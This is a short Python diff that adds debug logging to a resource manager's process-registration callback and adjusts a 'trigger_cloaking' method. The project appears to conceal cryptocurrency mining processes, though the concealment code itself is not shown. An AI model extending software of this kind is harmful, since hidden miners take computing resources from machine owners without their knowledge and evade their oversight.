@@ -392,6 +392,8 @@ class ResourceManager(IResourceManager):
     def _on_process_registered_direct(self, process_info) -> None:
         """**Handle Process Registration** (xử lý đăng ký process)"""
         try:
+            self.logger.info(f"🎯 [OBSERVER-CALLBACK] _on_process_registered_direct called with process_info: {process_info}")
+            
             # ProcessInfo is a dataclass, not a dict - access attributes directly
             if not hasattr(process_info, 'pid'):
                 self.logger.warning("ProcessInfo missing pid attribute")
@@ -399,7 +401,10 @@ class ResourceManager(IResourceManager):
                 
             pid = process_info.pid
             if not pid:
+                self.logger.warning(f"ProcessInfo has empty pid: {process_info}")
                 return
+            
+            self.logger.info(f"📍 [OBSERVER-CALLBACK] Processing PID {pid} from DirectPIDRegistry")
 
             # **Create MiningProcess** (tạo MiningProcess)
             # Extract cmd from metadata if available, otherwise use empty list
@@ -414,13 +419,16 @@ class ResourceManager(IResourceManager):
             )
 
             # **Trigger Cloaking** (kích hoạt che giấu)
+            self.logger.info(f"🚀 [OBSERVER-CALLBACK] About to trigger cloaking for PID {pid}")
             self.trigger_cloaking(mining_process, 'direct_registry')
+            self.logger.info(f"✅ [OBSERVER-CALLBACK] Cloaking triggered successfully for PID {pid}")
             
         except Exception as e:
             self.logger.error(f"Lỗi xử lý process registration: {e}")
 
-    def trigger_cloaking(self, process: MiningProcess, source: str):
-        """**TIER 1 FIX: Enhanced Trigger Cloaking** (kích hoạt che giấu nâng cao)"""
+    def trigger_cloaking(self, process: MiningProcess, source: str = 'unknown') -> bool:
+        """**Enhanced Trigger Cloaking** (kích hoạt che giấu nâng cao)"""
+        self.logger.info(f"🎯 [TRIGGER-CLOAKING] Called for PID {process.pid} from source: {source}")
         try:
             self.logger.info(f"🎯 [TIER-1] trigger_cloaking called for PID {process.pid} from source: {source}")
             
